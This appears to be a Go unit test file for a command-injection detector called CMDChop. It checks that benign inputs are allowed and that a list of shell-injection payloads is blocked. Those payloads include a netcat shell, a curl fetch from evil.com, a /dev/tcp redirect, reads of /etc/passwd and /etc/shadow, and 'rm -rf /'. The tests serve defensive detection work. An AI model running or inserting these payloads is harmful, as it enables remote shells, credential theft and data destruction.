package ast

import (
	"context"
	"strings"
	"testing"
	"time"

)

func TestCMDChop_BenignInputs(t *testing.T) {
	chop := NewCMDChop()
	ctx := context.Background()

	benignInputs := []string{
		"",
		"myfile.txt",
		"data_2026.csv",
		"--verbose",
		"-rf",
		"user123",
		"Hello World",
		"some/safe/relative/path.go",
	}

	for _, input := range benignInputs {
		t.Run("benign: "+input, func(t *testing.T) {
			verdict, err := chop.Verify(ctx, input)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionAllow {
				t.Errorf("expected ActionAllow for benign input %q, got %v (%s)", input, verdict.Action, verdict.Reason)
			}
		})
	}
}

func TestCMDChop_CommandInjectionVectors(t *testing.T) {
	chop := NewCMDChop()
	ctx := context.Background()

	cmdiVectors := []struct {
		name    string
		payload string
	}{
		{
			name:    "chained command with semicolon",
			payload: "; cat /etc/passwd",
		},
		{
			name:    "command substitution $(whoami)",
			payload: "$(whoami)",
		},
		{
			name:    "command pipeline with netcat",
			payload: "| nc -e /bin/sh",
		},
		{
			name:    "backtick command execution",
			payload: "`id`",
		},
		{
			name:    "logical AND chained command",
			payload: "&& rm -rf /",
		},
		{
			name:    "logical OR chained command with curl",
			payload: "|| curl http://evil.com/payload.sh",
		},
		{
			name:    "file redirect output",
			payload: "> /etc/cron.d/job",
		},
		{
			name:    "file redirect input",
			payload: "< /dev/tcp/10.0.0.1/4444",
		},
		{
			name:    "double-quote breakout with command separator",
			payload: "\" ; whoami ; \"",
		},
		{
			name:    "single-quote breakout with pipeline",
			payload: "' | cat /etc/shadow '",
		},
		{
			name:    "newline command separator",
			payload: "test\n/bin/sh",
		},
	}

	for _, tc := range cmdiVectors {
		t.Run(tc.name, func(t *testing.T) {
			verdict, err := chop.Verify(ctx, tc.payload)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if verdict.Action != ActionBlock {
				t.Errorf("expected ActionBlock for payload %q, got %v", tc.payload, verdict.Action)
			}
			if verdict.RuleID != "SEMANTIC_CMDI" {
				t.Errorf("expected RuleID SEMANTIC_CMDI, got %q", verdict.RuleID)
			}
			if !strings.Contains(verdict.Reason, "Command injection detected") {
				t.Errorf("expected Reason to mention Command injection, got %q", verdict.Reason)
			}
		})
	}
}

func TestCMDChop_32KBCap(t *testing.T) {
	chop := NewCMDChop()
	ctx := context.Background()

	// Create payload larger than 32 KB (33 KB)
	largePayload := strings.Repeat("A", 33*1024) + "; cat /etc/passwd"

	verdict, err := chop.Verify(ctx, largePayload)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Exceeding 32KB is skipped by AST verifier (rely on lexical triage)
	if verdict.Action != ActionAllow {
		t.Errorf("expected ActionAllow (skip) for >32KB parameter, got %v", verdict.Action)
	}
}

func TestCMDChop_Timeout(t *testing.T) {
	chop := &CMDChop{
		MaxParamSize: DefaultMaxParamSize,
		Timeout:      1 * time.Nanosecond,
	}

	input := "some command line string to parse and tokenize with various options"
	verdict, err := chop.Verify(context.Background(), input)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	if verdict.Action == ActionAudit {
		if verdict.RuleID != "PARSER_TIMEOUT" {
			t.Errorf("expected RuleID PARSER_TIMEOUT, got %q", verdict.RuleID)
		}
	}
}
